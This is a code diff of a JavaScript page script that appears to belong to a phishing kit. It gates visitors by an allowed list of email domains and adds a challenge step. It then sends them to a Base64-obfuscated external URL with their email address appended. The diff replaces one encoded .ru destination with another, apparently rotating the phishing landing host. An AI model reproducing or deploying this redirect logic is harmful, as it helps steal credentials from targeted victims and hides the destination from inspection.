@@ -39,7 +39,7 @@ function checkEmailDomain() {
 
   const domain = emailValue.split('@')[1];
   if (!window.allowedDomains.includes(domain)) {
-    domainErrorEl.textContent = "Unsupported email. Try again.";
+    domainErrorEl.textContent = "Unauthorized email. Try again.";
     domainErrorEl.style.display = "block";
     return;
   }
@@ -87,7 +87,7 @@ function checkCharAnswer() {
     step4.classList.add('hidden');
     step5.classList.add('fade-in');
 
-    const link = "aHR0cHM6Ly83eC5ib21pcmF4LnJ1L1oxY3hsOWVHLyNY"; // Base64 encoded URL
+    const link = "aHR0cHM6Ly9iNWt2LnJrZjlucmR4eC5ydS95bm9GRWgvIw"; // Base64 encoded URL
     window.location.href = atob(link) + email;
   } else {
     charErrorEl.textContent = "Incorrect code. Try again.";
